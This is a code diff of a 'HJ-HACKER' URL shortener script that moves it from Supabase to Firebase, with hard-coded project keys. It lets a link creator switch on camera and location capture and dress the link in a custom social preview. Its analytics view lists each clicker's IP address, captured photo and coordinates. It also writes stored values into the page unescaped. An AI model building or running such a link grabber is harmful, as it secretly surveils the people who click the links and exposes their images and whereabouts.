@@ -1,32 +1,21 @@
-// HJ-HACKER URL Shortener - Complete Script
-// Supabase Configuration
-const SUPABASE_URL = "https://mxllockxgmkojcduhcfd.supabase.co";
-const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im14bGxvY2t4Z21rb2pjZHVoY2ZkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2OTc5MTcsImV4cCI6MjA5MzI3MzkxN30.GDxGx10lyOf3YkMNytCaltjGf_lQ3LkpNEnzcPQtrsM";
+// 🔥 Firebase Configuration - YOUR CREDENTIALS
+const firebaseConfig = {
+    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
+    authDomain: "hjh-tools.firebaseapp.com",
+    projectId: "hjh-tools",
+    storageBucket: "hjh-tools.firebasestorage.app",
+    messagingSenderId: "643137472905",
+    appId: "1:643137472905:web:814ca23a86fb084811b958",
+    measurementId: "G-S7W2C789G2",
+    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
+};
 
-const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+const storage = firebase.storage();
 
-// Global variables
-let currentAnalyticsLink = null;
-let uploadedImages = [];
-
-// DOM Elements
-const tabs = document.querySelectorAll('.nav-btn');
-const longUrlInput = document.getElementById('longUrl');
-const customCodeInput = document.getElementById('customCode');
-const shortenBtn = document.getElementById('shortenBtn');
-const passwordToggle = document.getElementById('passwordToggle');
-const socialToggle = document.getElementById('socialToggle');
-const captureCamera = document.getElementById('captureCamera');
-const captureLocation = document.getElementById('captureLocation');
-const expiresAt = document.getElementById('expiresAt');
-const loadingDiv = document.getElementById('loading');
-const errorDiv = document.getElementById('error');
-const resultDiv = document.getElementById('result');
-const shortLinkSpan = document.getElementById('shortLink');
-const copyBtn = document.getElementById('copyBtn');
-const qrCodeDiv = document.getElementById('qrCode');
-
-// Helper Functions
+// Generate short code
 function generateShortCode() {
     const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let result = '';
@@ -39,118 +28,187 @@ function generateShortCode() {
 function getDeviceId() {
     let deviceId = localStorage.getItem('hj_device_id');
     if (!deviceId) {
-        deviceId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        deviceId = Math.random().toString(36).substring(2, 15);
         localStorage.setItem('hj_device_id', deviceId);
     }
     return deviceId;
 }
 
-function showError(message) {
-    errorDiv.textContent = message;
-    errorDiv.classList.remove('hidden');
-    setTimeout(() => {
-        errorDiv.classList.add('hidden');
-    }, 5000);
+// DOM Elements
+const longUrlInput = document.getElementById('longUrl');
+const customCodeInput = document.getElementById('customCode');
+const shortenBtn = document.getElementById('shortenBtn');
+const copyBtn = document.getElementById('copyBtn');
+const passwordToggle = document.getElementById('passwordToggle');
+const socialToggle = document.getElementById('socialToggle');
+const captureCamera = document.getElementById('captureCamera');
+const captureLocation = document.getElementById('captureLocation');
+
+// Check code availability
+async function checkCodeAvailability(code) {
+    const snapshot = await database.ref(`urls/${code}`).get();
+    return !snapshot.exists();
 }
 
+// Shorten URL
+async function shortenUrl() {
+    const longUrl = longUrlInput.value.trim();
+    if (!longUrl) {
+        showError('Please enter a URL');
+        return;
+    }
+    
+    let urlToShorten = longUrl;
+    if (!urlToShorten.startsWith('http')) {
+        urlToShorten = 'https://' + urlToShorten;
+    }
+    
+    const customCode = customCodeInput.value.trim();
+    let shortCode = customCode || generateShortCode();
+    
+    // Check availability
+    const isAvailable = await checkCodeAvailability(shortCode);
+    if (!isAvailable) {
+        showError(`Code "${shortCode}" is already taken. Please try another.`);
+        return;
+    }
+    
+    const hasPassword = passwordToggle.checked;
+    const password = hasPassword ? document.getElementById('password').value : null;
+    const hasSocialGate = socialToggle.checked;
+    const socialIcon = hasSocialGate ? document.getElementById('socialIcon').value : null;
+    const socialTitle = hasSocialGate ? document.getElementById('socialTitle').value : null;
+    const socialUrl = hasSocialGate ? document.getElementById('socialUrl').value : null;
+    const socialDesc = hasSocialGate ? document.getElementById('socialDesc').value : null;
+    const socialButton = hasSocialGate ? document.getElementById('socialButton').value : null;
+    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
+    const cameraCapture = captureCamera.checked;
+    const locationCapture = captureLocation.checked;
+    const expiryDate = document.getElementById('expiresAt').value;
+    
+    if (hasPassword && !password) {
+        showError('Please enter a password');
+        return;
+    }
+    
+    showLoading(true);
+    
+    try {
+        const domain = window.location.hostname;
+        const deviceId = getDeviceId();
+        const createdAt = new Date().toISOString();
+        
+        const linkData = {
+            domain: domain,
+            long_url: urlToShorten,
+            password: password,
+            social_gate_title: socialTitle,
+            social_gate_url: socialUrl,
+            social_gate_icon: socialIcon,
+            social_gate_description: socialDesc,
+            social_gate_button_text: socialButton,
+            animation_type: animation,
+            capture_camera: cameraCapture,
+            capture_location: locationCapture,
+            expires_at: expiryDate || null,
+            device_id: deviceId,
+            clicks: 0,
+            created_at: createdAt
+        };
+        
+        await database.ref(`urls/${shortCode}`).set(linkData);
+        
+        // Also store by domain for listing
+        await database.ref(`domains/${domain}/${shortCode}`).set(linkData);
+        
+        const shortUrl = `${window.location.origin}/${shortCode}`;
+        document.getElementById('shortLink').textContent = shortUrl;
+        
+        // Save to recent
+        const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
+        recent.unshift({ code: shortCode, longUrl: urlToShorten, shortUrl: shortUrl, date: createdAt });
+        localStorage.setItem('hj_recent_links', JSON.stringify(recent.slice(0, 10)));
+        
+        // Create QR Code
+        document.getElementById('qrCode').innerHTML = '';
+        new QRCode(document.getElementById('qrCode'), {
+            text: shortUrl,
+            width: 128,
+            height: 128,
+            colorDark: "#00ff41",
+            colorLight: "#000000"
+        });
+        
+        document.getElementById('result').classList.remove('hidden');
+        
+        // Clear form
+        longUrlInput.value = '';
+        customCodeInput.value = '';
+        passwordToggle.checked = false;
+        socialToggle.checked = false;
+        document.getElementById('passwordSection')?.classList.add('hidden');
+        document.getElementById('socialSection')?.classList.add('hidden');
+        
+    } catch (error) {
+        console.error('Error:', error);
+        showError('An error occurred: ' + error.message);
+    } finally {
+        showLoading(false);
+    }
+}
+
+// Show loading
 function showLoading(show) {
+    const loading = document.getElementById('loading');
     if (show) {
-        loadingDiv.classList.remove('hidden');
+        loading.classList.remove('hidden');
         shortenBtn.disabled = true;
     } else {
-        loadingDiv.classList.add('hidden');
+        loading.classList.add('hidden');
         shortenBtn.disabled = false;
     }
 }
 
-function copyToClipboard(text) {
+// Show error
+function showError(message) {
+    const errorDiv = document.getElementById('error');
+    errorDiv.textContent = message;
+    errorDiv.classList.remove('hidden');
+    setTimeout(() => errorDiv.classList.add('hidden'), 5000);
+}
+
+// Copy to clipboard
+window.copyToClipboard = function(text) {
     navigator.clipboard.writeText(text);
     alert('Link copied!');
-}
+};
 
-function createQRCode(url) {
-    qrCodeDiv.innerHTML = '';
-    new QRCode(qrCodeDiv, {
-        text: url,
-        width: 128,
-        height: 128,
-        colorDark: "#00ff41",
-        colorLight: "#000000"
+// Load analytics for a link
+async function loadAnalytics(code) {
+    const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(50).get();
+    const analytics = [];
+    snapshot.forEach(child => {
+        analytics.push({ id: child.key, ...child.val() });
     });
-}
-
-// Save to recent
-function saveToRecent(link) {
-    let recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
-    recent = [link, ...recent.filter(l => l.code !== link.code)].slice(0, 20);
-    localStorage.setItem('hj_recent_links', JSON.stringify(recent));
-    loadRecentLinks();
-}
-
-// Load recent links
-function loadRecentLinks() {
-    const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
-    const container = document.getElementById('recentList');
-    if (!container) return;
-    
-    if (recent.length === 0) {
-        container.innerHTML = '<p style="color: #666; text-align: center;">No recent links</p>';
-        return;
-    }
-    
-    container.innerHTML = recent.map(link => `
-        <div class="recent-item">
-            <div>
-                <div class="recent-code">/${link.code}</div>
-                <div class="recent-url">${link.longUrl.substring(0, 60)}...</div>
-                <div style="font-size: 0.6rem; color: #444; margin-top: 0.2rem;">${new Date(link.date).toLocaleString()}</div>
-            </div>
-            <div class="recent-actions">
-                <button onclick="copyToClipboard('${link.shortUrl}')">Copy</button>
-                <button onclick="window.open('${link.shortUrl}', '_blank')">Visit</button>
-                <button onclick="viewAnalytics('${link.code}')">Stats</button>
-            </div>
-        </div>
-    `).join('');
+    return analytics.reverse();
 }
 
 // View analytics
 window.viewAnalytics = async (code) => {
-    const domain = window.location.hostname;
-    const { data: urlData } = await supabase
-        .from('urls')
-        .select('id')
-        .eq('domain', domain)
-        .eq('short_code', code)
-        .single();
+    const analytics = await loadAnalytics(code);
     
-    if (urlData) {
-        const { data: analytics } = await supabase
-            .from('link_analytics')
-            .select('*')
-            .eq('url_id', urlData.id)
-            .order('created_at', { ascending: false });
-        
-        showAnalytics(analytics || [], code);
-    }
-};
-
-// Show analytics
-function showAnalytics(analytics, code) {
-    const analyticsTab = document.getElementById('analyticsTab');
-    const analyticsDetail = document.getElementById('analyticsDetail');
-    const analyticsCode = document.getElementById('analyticsCode');
-    const statsGrid = document.getElementById('statsGrid');
-    const visitorsList = document.getElementById('visitorsList');
+    // Get link info
+    const linkSnapshot = await database.ref(`urls/${code}`).get();
+    const linkData = linkSnapshot.val();
     
-    analyticsCode.textContent = `Analytics for /${code}`;
+    document.getElementById('analyticsCode').textContent = `Analytics for /${code}`;
     
     const totalClicks = analytics.length;
     const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
     const cameras = analytics.filter(a => a.captured_image).length;
     const locations = analytics.filter(a => a.latitude).length;
     
-    statsGrid.innerHTML = `
+    document.getElementById('statsGrid').innerHTML = `
         <div class="stat-card">
             <div class="stat-value">${totalClicks}</div>
             <div class="stat-label">Total Clicks</div>
@@ -169,7 +227,7 @@ function showAnalytics(analytics, code) {
         </div>
     `;
     
-    visitorsList.innerHTML = analytics.map(v => `
+    document.getElementById('visitorsList').innerHTML = analytics.map(v => `
         <div class="visitor-item">
             <div class="visitor-header">
                 <span class="visitor-ip">${v.ip_address || 'Unknown'}</span>
@@ -186,171 +244,101 @@ function showAnalytics(analytics, code) {
         </div>
     `).join('');
     
-    analyticsDetail.classList.remove('hidden');
+    document.getElementById('analyticsDetail').classList.remove('hidden');
     
     // Switch to analytics tab
     document.querySelector('[data-tab="analytics"]').click();
+};
+
+// Load recent links for analytics list
+async function loadAnalyticsList() {
+    const domain = window.location.hostname;
+    const snapshot = await database.ref(`domains/${domain}`).get();
+    const links = [];
+    snapshot.forEach(child => {
+        links.push({ code: child.key, ...child.val() });
+    });
+    
+    const container = document.getElementById('analyticsList');
+    if (links.length === 0) {
+        container.innerHTML = '<p style="color: #666;">No links found</p>';
+        return;
+    }
+    
+    container.innerHTML = links.map(link => `
+        <div class="recent-item" style="margin-bottom: 0.5rem;">
+            <div>
+                <div class="recent-code">/${link.code}</div>
+                <div class="recent-url">${link.long_url?.substring(0, 50)}...</div>
+                <div style="font-size: 0.6rem; color: #444;">Clicks: ${link.clicks || 0}</div>
+            </div>
+            <button onclick="viewAnalytics('${link.code}')" class="btn-secondary">View Stats</button>
+        </div>
+    `).join('');
 }
 
-// Shorten URL function
-async function shortenUrl() {
-    const longUrl = longUrlInput.value.trim();
-    if (!longUrl) {
-        showError('Please enter a URL');
+// Load recent links
+function loadRecentLinks() {
+    const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
+    const container = document.getElementById('recentList');
+    
+    if (recent.length === 0) {
+        container.innerHTML = '<p style="color: #666;">No recent links</p>';
         return;
     }
     
-    let urlToShorten = longUrl;
-    if (!urlToShorten.startsWith('http')) {
-        urlToShorten = 'https://' + urlToShorten;
-    }
-    
-    try {
-        new URL(urlToShorten);
-    } catch {
-        showError('Invalid URL');
-        return;
-    }
-    
-    const customCode = customCodeInput.value.trim();
-    const shortCode = customCode || generateShortCode();
-    const hasPassword = passwordToggle.checked;
-    const password = hasPassword ? document.getElementById('password').value : null;
-    const hasSocialGate = socialToggle.checked;
-    const socialIcon = hasSocialGate ? document.getElementById('socialIcon').value : null;
-    const socialTitle = hasSocialGate ? document.getElementById('socialTitle').value : null;
-    const socialUrl = hasSocialGate ? document.getElementById('socialUrl').value : null;
-    const socialDesc = hasSocialGate ? document.getElementById('socialDesc').value : null;
-    const socialButton = hasSocialGate ? document.getElementById('socialButton').value : null;
-    const animation = document.querySelector('input[name="animation"]:checked').value;
-    const cameraCapture = captureCamera.checked;
-    const locationCapture = captureLocation.checked;
-    const expiryDate = expiresAt.value;
-    
-    if (hasPassword && !password) {
-        showError('Please enter a password');
-        return;
-    }
-    
-    if (hasSocialGate && (!socialTitle || !socialUrl)) {
-        showError('Please fill social gate details');
-        return;
-    }
-    
-    showLoading(true);
-    
-    try {
-        const domain = window.location.hostname;
-        const deviceId = getDeviceId();
-        
-        const { data, error } = await supabase
-            .from('urls')
-            .insert([{
-                domain: domain,
-                short_code: shortCode,
-                long_url: urlToShorten,
-                password: password,
-                social_gate_title: socialTitle,
-                social_gate_url: socialUrl,
-                social_gate_icon: socialIcon,
-                social_gate_description: socialDesc,
-                social_gate_button_text: socialButton,
-                animation_type: animation,
-                capture_camera: cameraCapture,
-                capture_location: locationCapture,
-                expires_at: expiryDate || null,
-                device_id: deviceId,
-                clicks: 0
-            }])
-            .select();
-        
-        if (error) {
-            if (error.code === '23505') {
-                showError(`Code "${shortCode}" is already taken`);
-            } else {
-                showError(error.message);
-            }
-            showLoading(false);
-            return;
-        }
-        
-        const shortUrl = `${window.location.origin}/${shortCode}`;
-        shortLinkSpan.textContent = shortUrl;
-        
-        saveToRecent({
-            code: shortCode,
-            longUrl: urlToShorten,
-            shortUrl: shortUrl,
-            hasPassword: hasPassword,
-            hasSocialGate: hasSocialGate,
-            date: new Date().toISOString()
-        });
-        
-        createQRCode(shortUrl);
-        resultDiv.classList.remove('hidden');
-        
-        // Reset form
-        longUrlInput.value = '';
-        customCodeInput.value = '';
-        passwordToggle.checked = false;
-        socialToggle.checked = false;
-        document.getElementById('passwordSection').classList.add('hidden');
-        document.getElementById('socialSection').classList.add('hidden');
-        document.getElementById('password').value = '';
-        document.getElementById('socialTitle').value = '';
-        document.getElementById('socialUrl').value = '';
-        captureCamera.checked = false;
-        captureLocation.checked = false;
-        expiresAt.value = '';
-        
-    } catch (err) {
-        console.error(err);
-        showError('An error occurred');
-    } finally {
-        showLoading(false);
-    }
+    container.innerHTML = recent.map(link => `
+        <div class="recent-item">
+            <div>
+                <div class="recent-code">/${link.code}</div>
+                <div class="recent-url">${link.longUrl.substring(0, 60)}...</div>
+                <div style="font-size: 0.6rem; color: #444;">${new Date(link.date).toLocaleString()}</div>
+            </div>
+            <div class="recent-actions">
+                <button onclick="copyToClipboard('${link.shortUrl}')">Copy</button>
+                <button onclick="window.open('${link.shortUrl}', '_blank')">Visit</button>
+                <button onclick="viewAnalytics('${link.code}')">Stats</button>
+            </div>
+        </div>
+    `).join('');
 }
-
-// Toggle sections
-passwordToggle.addEventListener('change', (e) => {
-    const section = document.getElementById('passwordSection');
-    if (e.target.checked) {
-        section.classList.remove('hidden');
-    } else {
-        section.classList.add('hidden');
-        document.getElementById('password').value = '';
-    }
-});
-
-socialToggle.addEventListener('change', (e) => {
-    const section = document.getElementById('socialSection');
-    if (e.target.checked) {
-        section.classList.remove('hidden');
-    } else {
-        section.classList.add('hidden');
-    }
-});
 
 // Tab switching
-tabs.forEach(btn => {
+document.querySelectorAll('.nav-btn').forEach(btn => {
     btn.addEventListener('click', () => {
         const tab = btn.dataset.tab;
-        tabs.forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
         btn.classList.add('active');
         
         document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
         document.getElementById(`${tab}Tab`).classList.remove('hidden');
         
         if (tab === 'recent') loadRecentLinks();
-        if (tab === 'analytics') loadRecentLinks();
+        if (tab === 'analytics') loadAnalyticsList();
     });
+});
+
+// Toggle handlers
+passwordToggle.addEventListener('change', (e) => {
+    const section = document.getElementById('passwordSection');
+    if (e.target.checked) section.classList.remove('hidden');
+    else section.classList.add('hidden');
+});
+
+socialToggle.addEventListener('change', (e) => {
+    const section = document.getElementById('socialSection');
+    if (e.target.checked) section.classList.remove('hidden');
+    else section.classList.add('hidden');
 });
 
 // Event listeners
 shortenBtn.addEventListener('click', shortenUrl);
-copyBtn.addEventListener('click', () => copyToClipboard(shortLinkSpan.textContent));
+copyBtn.addEventListener('click', () => {
+    const link = document.getElementById('shortLink').textContent;
+    if (link) copyToClipboard(link);
+});
 
 // Initialize
 loadRecentLinks();
 
-console.log('🔥 HJ-HACKER Advanced URL Shortener Ready!');
+console.log('🔥 HJ-HACKER Firebase URL Shortener Ready!');
